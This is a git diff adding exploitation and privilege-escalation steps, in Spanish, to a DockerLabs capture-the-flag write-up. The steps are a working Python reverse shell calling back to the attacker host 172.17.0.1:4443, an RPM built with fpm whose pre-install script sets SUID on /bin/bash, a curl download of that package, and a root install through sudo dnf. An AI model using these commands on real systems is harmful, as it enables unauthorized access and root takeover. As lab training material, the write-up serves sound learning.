@@ -60,6 +60,83 @@ PORT     STATE SERVICE REASON         VERSION
 Vamos a ver que encontramos en el puerto 5000 y vemos que es una página con lo que parece un intérprete de **Python**.
 ![python](https://github.com/TBrux/DOCKERLABS/assets/168732212/62e5c69b-3c12-446f-b82e-420d76ab694a)
 
+## Explotación.
+
+Lo siguiente es ponernos a la escucha en un puerto en nuestro equipo y enviarnos una reverse shell desde el interprete de **Pyhton**.
+```
+❯ nc -lvnp 4443
+listening on [any] 4443 ...
+```
+```python
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.17.0.1", 4443))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/sh", "-i"])
+```
+Una vez lo lanzamos ya establemos la reverse shell con el usuario primpi.
+```
+❯ nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33108
+sh: cannot set terminal process group (1): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-5.2$ whoami
+whoami
+primpi
+sh-5.2$ 
+````
+## Escalada de privilegios.
+Comprobamos binarios y archivos que podemos lanzar como root u otro usuario con más privilegios.
+```bash
+sudo -l
+```
+```
+sh-5.2$ sudo -l
+sudo -l
+Matching Defaults entries for primpi on c35c7f5e90f9:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin
+
+User primpi may run the following commands on c35c7f5e90f9:
+    (ALL) NOPASSWD: /usr/bin/dnf
+```
+Vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/) y vemos que podemos ver los pasos para crear un archivo malicioso que después subiremo a la máquina lo ejecutaremos con **/usr/bin/dnf**.
+```bash
+❯ TF=$(mktemp -d)
+echo 'chmod u+s /bin/bash' > $TF/x.sh
+fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
+Created package {:path=>"x-1.0-1.noarch.rpm"}
+```
+Hemos creardo el archivo **x-1.0-1.noarch.rpm** que ahora lo subiremos a la máquina victima creando un servidor **http** con python en el directorio donde tenemos nuestro archivo y con **curl** lo descargamos en la máquina victima en la carpeta
 
 
+```bash
+python3 -m http.server 8080
+```
+```bash
+curl 172.17.0.1/x-1.0-1.noarch.rpm -o noarch.rpm
+```
+Una vez ya lo tenemos en la máquina víctima, lo instalamos con el binario **/usr/bin/dnf** y así cambiamos el SUID de bash y podemos ejecutarla comor **root**.
+```bash
+sudo -u root /usr/bin/dnf install -y noarch.rpm
+```
+```bash
+bash -p
+```
+```
+sh-5.2$ bash -p
+whoami
+root
+```
 
